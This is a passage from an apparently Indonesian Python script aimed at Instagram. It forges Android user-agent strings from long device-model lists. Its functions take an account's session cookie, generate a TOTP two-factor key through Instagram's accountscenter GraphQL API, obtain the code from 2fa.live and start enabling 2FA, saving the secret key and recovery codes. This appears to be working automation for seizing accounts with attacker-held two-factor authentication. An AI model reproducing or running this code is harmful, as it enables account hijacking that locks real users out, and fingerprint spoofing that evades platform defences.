'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
        self.redmi   = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', '23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
        dpis, pxl = self.dpi.split(';')[0], self.dpi.split(';')[1].replace(' ','')
        kode      = random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
        self.samsung_app = f'Instagram {self.version} Android ({self.android}; {self.dpi.split(";")[0]}; {self.dpi.split(";")[1].replace(" ","")}; samsung; {self.samsung}; a03; ums9230_25c10; id_ID; 545986900)'
        self.redmi_app   = f'Instagram {self.version} Android (29/10; {self.dpi.split(";")[0]}; {self.dpi.split(";")[1].replace(" ","")}; Xiaomi/xiaomi; {self.redmi}; lavender; qcom; id_ID; 545986901)'
        self.infinix_app = f'Instagram {self.version} Android (30/11; {self.dpi.split(";")[0]}; {self.dpi.split(";")[1].replace(" ","")}; INFINIX MOBILITY LIMITED/Infinix; {self.infinix}; {self.infinix}; mt6761; in_ID; 345526700)'
        self.nokia       = f'Instagram {self.version} Android ({self.android}; {dpis}; {pxl}; HMD Global/Nokia; Nokia 2.4; WVR_sprout; mt6762; id_ID; {kode})'
        return random.choice(
        [self.infinix_app, self.redmi_app, self.samsung_app, self.nokia])


    def OnAuthenA2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
        try:
            resp = session.get(url, cookies = {'cookie': cokie}).text
            head = self.headers_graph(resp)
            head.update({
                  'Host': 'accountscenter.instagram.com',
                  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                  'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                  'content-type': 'application/x-www-form-urlencoded',
                  'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
                  'x-ig-app-id': '1217981644879628',
            })
            data = self.data_graph(resp)
            data.update({
                  'fb_api_caller_class':'RelayModern',
                  'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                  'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
                  'doc_id':'6282672078501565',
            })
            get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
            if "totp_key" in str(get_p):
                xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
                hpsx = xnxx.replace(' ','')
                kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
                self.info.update({'SecretKey':hpsx})
                self.AktifkanA2f(cokie, kode, resp, hpsx)
            else:
                self.info.update({'SecretKey':'Tidak Ada'})
                self.info.update({'success-a2f':False})
                self.info.update({'kode-pemulihan':'Tidak Ada'})
        except:
            self.info.update({'SecretKey':'Tidak Ada'})
            self.info.update({'success-a2f':False})
            self.info.update({'kode-pemulihan':'Tidak Ada'})
        return self.info

    def AktifkanA2f(self, cokie, code, resp, auth):
        try:
            xxx, ua = resp, 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
            head = {
                'Host': 'accountscenter.instagram.com',
                'x-ig-app-id': '1217981644879628',
                'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'no-cors',
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
            }
